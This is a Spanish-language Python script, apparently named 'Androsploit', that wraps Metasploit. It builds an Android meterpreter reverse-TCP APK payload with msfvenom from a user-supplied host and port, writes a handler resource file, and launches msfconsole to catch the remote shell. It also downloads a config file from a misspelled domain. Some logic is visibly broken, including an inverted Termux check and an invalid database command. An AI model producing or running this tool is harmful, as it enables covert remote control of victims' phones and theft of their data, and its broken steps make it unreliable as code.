import os.path
import time


class colors:
	am = "\033[1;33m"
	rj = "\033[91m"
	ci = "\033[1;36m"
	vr = "\033[32m"
	vrf = "\033[42m"
	f = "\033[0m"

kali = os.path.exists("/usr/share/metasploit-framework")
termux = os.path.exists("/data/data/com.termux/files/usr/opt/metasploit-framework")

def ini():
	if kali == True:
		kali_linux()
	elif termux == True:
		very()

def banner():
	print (colors.vr + '''				
			███████▀▀▀░░░░░░░▀▀▀███████
			████▀░░░░░░░░░░░░░░░░░▀████
			███│░░░░░░░░░░░░░░░░░░░│███
			██▌│░░░░░░░░░░░░░░░░░░░│▐██
			██░└┐░░░░░░░░░░░░░░░░░┌┘░██
			██░░└┐░░░░░░░░░░░░░░░┌┘░░██
			██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
			██▌░│██████▌░░░▐██████│░▐██
			███░│▐███▀▀░░▄░░▀▀███▌│░███
			██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
			██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
			████▄─┘██▌░░░░░░░▐██└─▄████
			█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
			████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
			█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
			███████▄░░░░░░░░░░░▄███████
			██████████▄▄▄▄▄▄▄██████████
										''' + colors.f)
	print ("                      -------------------------------")
	print ("                           Informática y Hacking   ")
	print ("                      -------------------------------")
	print ("                      https://informaticayhacking.cf")
	print ("                      -------------------------------\n\n")


def kali_linux():
	if kali == False:
		print (colors.am + "Error, no se ha encontrado Metasploit Framework en su sistema " + colors.f + colors.rj + "[X]" + colors.f)
	else:
		os.system("clear")
		print (colors.vrf + "Verificando Metasploit Framework en su sistema...\n" + colors.f)
		time.sleep(2)
		print (colors.ci + "Metasploit Framework " + colors.f + "[" + colors.vr + "OK"  + colors.f + "]\n")
		time.sleep(2)
		print (colors.am + "Ejecutando Androsploit en Kali Linux..." + colors.f)
		time.sleep(2)
		banner()
		nom = input (colors.ci + "Ingrese un nombre para su Payload" + colors.f + colors.rj + " >>  " + colors.f)
		print ("")
		host = input (colors.ci + "Ingrese su Host o IP " + colors.f + colors.rj + " >>  " + colors.f)
		print ("")
		port = input (colors.ci + "Ingrese el Puerto " + colors.f + colors.rj + " >>  " + colors.f)
		print ("\n")
		print (colors.am + "Generando " + nom + ".apk, por favor espere..." + colors.f)
		time.sleep(2)
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + host + " LPORT=" + port + " R > /root/Escritorio/" + nom + ".apk")
		print ("\n\n")
		pport = input (colors.ci + "En caso de usar Ngrok, Serveo o Portmap ingrese su puerto local de lo contrario use el mismo que se ingresó anteriormente " + colors.f + colors.rj + ">>  " + colors.f)
		os.system("clear")
		print ("")
		print (colors.vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en /Escritorio/" + colors.f)
		time.sleep(3)
		os.system("touch autos.rc")
		os.system("echo 'use exploit/multi/handler' >> autos.rc")
		os.system("echo 'set payload android/meterpreter/reverse_tcp' >> autos.rc")
		os.system("echo 'set lhost '" + host + ">> autos.rc")
		os.system("echo 'set lport '" + pport + ">> autos.rc")
		os.system("echo 'exploit' >> autos.rc")
		os.system("curl -LO https://Auxilus.girhub.io/database.yml")
		os.system("mkdir -p $PREFIX/var/lib/postgresql")
		os.system("initdb $PREFIX/var/lib/postgresql")
		os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
		os.system("createuser msf")
		os.system("create msf_database")
		os.system("msfdb reinit")
		os.system("clear")
		print (colors.vr + "Configurando msfconsole espere..." + colors.f)
		os.system("msfconsole -r autos.rc")

def good():

	os.system("clear")
	print (colors.vrf + "Verificando Metasploit Framework en su sistema...\n" + colors.f)
	time.sleep(2)
	print ("Metasploit Framework " + colors.vr + "[OK]\n" + colors.f)
	time.sleep(1)
	print (colors.am + "Ejecutando Androsploit en Termux..." + colors.f)
	time.sleep(1)
	banner()
	nom = input (colors.ci + "Ingrese un nombre para su Payload" + colors.f + colors.rj + " >>  " + colors.f)
	print ("")
	host = input (colors.ci + "Ingrese su Host o IP " + colors.f + colors.rj + " >>  " + colors.f)
	print ("")
	port = input (colors.ci + "Ingrese el Puerto " + colors.f + colors.rj + " >>  " + colors.f)
	print ("\n\n")
	print (colors.am + "Generando " + nom + ".apk, por favor espere...\n\n" + colors.f)
	time.sleep(2)
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + host + " LPORT=" + port + " R > /storage/emulated/0/" + nom + ".apk")
	pport = input (colors.ci + "En caso de usar Ngrok, Serveo o Portmap, ingrese su puerto local de lo contrario use el mismo que se ingresó anteriormente " + colors.f + colors.rj + ">>  " + colors.f)
	os.system("clear")
	print ("")
	print (colors.vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en su memoria interna." + colors.f)
	time.sleep(3)
	os.system("touch autos.rc")
	os.system("echo 'use exploit/multi/handler' >> autos.rc")
	os.system("echo 'set payload android/meterpreter/reverse_tcp' >> autos.rc")
	os.system("echo 'set lhost '" + host + ">> autos.rc")
	os.system("echo 'set lport '" + pport + ">> autos.rc")
	os.system("echo 'exploit' >> autos.rc")
	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
	os.system("mkdir -p $PREFIX/var/lib/postgresql")
	os.system("initdb $PREFIX/var/lib/postgresql")
	os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
	os.system("createuser msf")
	os.system("create msf_database")
	os.system("clear")
	print (colors.vr + "Configurando msfconsole espere..." + colors.f)
	os.system("msfconsole -r autos.rc")



def very():

	if termux == False:
		os.system("clear")
		banner()

		print (colors.am + "Error, no se ha encontrado Metasploit Framework en su sistema " + colors.f + colors.rj + "[X]" + colors.f)
		print ("")
		elec = input(colors.ci + "Desea Instalar Metasploit Framework?" + colors.f + colors.am + " [s/n] " + colors.f + colors.rj + ">>  " + colors.f)
		print ("")
		if elec == "s":
			print ("")
			print (colors.am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + colors.f)
			os.system("pkg install unstable-repo")
			os.system("pkg install metasploit")
			os.system("clear")
			print ("")
			print (colors.vrf + "Verificando la instalación de Metasploit Framework en su sistema..." + colors.f)
			if termux == False:
				banner()
				print ("")
				print (colors.rj + "Hubo un error durante la instalación, intente ejecutar" + colors.f + colors.am + " 'pkg upgrade -y'" + colors.f)
				
			else:
				good()
		elif elec == "n":
			banner()
			print ("")
			print (colors.rj + "Se necesita Metasploit Framework para funcionar." + colors.f)
			
		elif elec != "s" or "n":
			banner()
			print ("")
			print (colors.am + "¡Debe ingresar una opción válida.!"+ colors.f)
			time.sleep(2)
			very()
	else:
		good()
ini()
